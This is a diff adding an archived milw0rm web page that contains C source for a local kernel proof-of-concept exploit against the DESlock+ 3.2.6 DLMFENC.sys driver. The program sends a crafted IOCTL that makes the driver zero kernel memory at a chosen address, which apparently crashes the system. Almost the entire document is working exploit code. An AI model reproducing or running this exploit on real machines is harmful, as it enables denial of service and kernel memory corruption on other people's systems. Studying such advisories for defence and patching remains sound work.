@@ -1,0 +1,90 @@
+From: <ÓÉ Windows Internet Explorer 7 ±£´æ>
+Subject: DESlock+ <= 3.2.6 DLMFENC.sys Local Kernel ring0 link list zero PoC
+Date: Sat, 27 Mar 2010 23:08:05 +0800
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+Content-Location: http://milw0rm.com/exploits/5142
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2900.5579
+
+=EF=BB=BF<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<HTML><HEAD><TITLE>DESlock+ <=3D 3.2.6 DLMFENC.sys Local Kernel ring0 =
+link list zero PoC</TITLE>
+<META http-equiv=3DContent-Type content=3D"text/html; charset=3Dutf-8">
+<META content=3D"MSHTML 6.00.6000.16981" name=3DGENERATOR></HEAD>
+<BODY><PRE>/* deslock-list-zero.c
+ *
+ * Copyright (c) 2008 by &lt;mu-b@digit-labs.org&gt;
+ *
+ * DESlock+ &lt;=3D 3.2.6 local kernel ring0 link list zero POC
+ * by mu-b - Fri 21 Dec 2007
+ *
+ * - Tested on: DLMFENC.sys 1.0.0.26
+ *
+ *    - Private Source Code -DO NOT DISTRIBUTE -
+ * http://www.digit-labs.org/ -- Digit-Labs 2008!@$!
+ */
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+#include &lt;windows.h&gt;
+
+#define DLMFENC_IOCTL 0x0FA4204C
+#define DLMFENC_FLAG  0xDEADBEEF
+#define ZERO_MEM      0xDEADBEEF
+
+#define ARG_SIZE(a)   ((a-(sizeof (int)*2))/sizeof (void *))
+
+struct ioctl_req {
+  int flag;
+  int req_num;
+  void *arg[ARG_SIZE(0x20)];
+};
+
+int
+main (int argc, char **argv)
+{
+  struct ioctl_req req;
+  HANDLE hFile;
+  BOOL result;
+  DWORD rlen;
+
+  printf ("DESlock+ &lt;=3D 3.2.6 local kernel ring0 link list zero =
+PoC\n"
+          "by: &lt;mu-b@digit-labs.org&gt;\n"
+          "http://www.digit-labs.org/ -- Digit-Labs 2008!@$!\n\n");
+
+  fflush (stdout);
+  hFile =3D CreateFileA ("\\\\.\\DLKPFSD_Device", FILE_EXECUTE,
+                       FILE_SHARE_READ|FILE_SHARE_WRITE, NULL,
+                       OPEN_EXISTING, 0, NULL);
+  if (hFile =3D=3D INVALID_HANDLE_VALUE)
+    {
+      fprintf (stderr, "* CreateFileA failed, %d\n", hFile);
+      exit (EXIT_FAILURE);
+    }
+
+  memset (&amp;req, 0, sizeof req);
+  req.flag =3D DLMFENC_FLAG;
+  req.req_num =3D 4;
+  req.arg[0] =3D (void *) ZERO_MEM;
+
+  result =3D DeviceIoControl (hFile, DLMFENC_IOCTL,
+                            &amp;req, sizeof req, &amp;req, sizeof req, =
+&amp;rlen, 0);
+  if (!result)
+    {
+      fprintf (stderr, "* DeviceIoControl failed\n");
+      exit (EXIT_FAILURE);
+    }
+
+  printf ("* hmmm, you didn't STOP the box?!?! rlen: %d\n", rlen);
+
+  CloseHandle (hFile);
+
+  return (EXIT_SUCCESS);
+}
+
+// milw0rm.com [2008-02-18]</PRE></BODY></HTML>
